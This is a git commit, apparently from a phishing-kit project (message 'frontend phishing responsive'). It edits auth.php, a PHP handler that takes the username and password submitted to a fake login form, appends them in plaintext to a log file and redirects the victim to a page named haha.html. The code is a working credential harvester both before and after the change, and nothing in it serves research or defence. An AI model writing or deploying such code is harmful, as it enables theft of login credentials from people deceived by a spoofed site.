e8445792b200cd84c52cac31af4d4de729d33b76
daniellisachuk <daniellisachuk@gmail.com>
2020-10-09 14:47:23 -0400

    frontend phishing responsive

--- html/auth.php
+++ html/auth.php
@@ -1,8 +1,8 @@
 <?php
-  $log_file_name = 'unames_pwords.log'; // Change to the log file name
+  $log_file_name = 'unames_pwords.txt';
   $n = $_POST['name'];
-  $p = $_POST['pass'];
-  $message = "Login name : ".$n."\t" . "password ".$p."\n";
-  file_put_contents($log_file_name, $message, FILE_APPEND);
+	$p = $_POST['pass'];
+ 	 $message = "Login name : ".$n."\t" . "password : ".$p."\n";
+ 	 file_put_contents($log_file_name, $message, FILE_APPEND);
   header('Location: /haha.html'); // redirect back to the main site
 ?>
